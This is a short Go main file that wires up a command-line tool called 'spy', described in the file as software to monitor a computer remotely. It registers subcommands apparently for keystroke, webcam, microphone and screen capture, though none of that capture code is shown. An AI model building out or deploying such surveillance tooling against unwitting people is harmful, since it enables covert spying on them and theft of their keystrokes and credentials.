package main

import (
	"os"

	"github.com/cinus-e/spy/cmd"
	"github.com/cinus-e/spy/internal/literr"
	"github.com/urfave/cli/v2"
)

func main() {
	app := cli.NewApp()
	app.Name = "spy"
	app.Usage = "Spy software to monitor computer remotely"
	app.Version = "0.0.3.20221016"
	app.Commands = []*cli.Command{
		cmd.App,
		cmd.Cam,
		cmd.Key,
		cmd.Mic,
		cmd.Scr,
		cmd.Ste,
	}
	literr.Discard = false
	literr.CheckFatal(app.Run(os.Args))
}
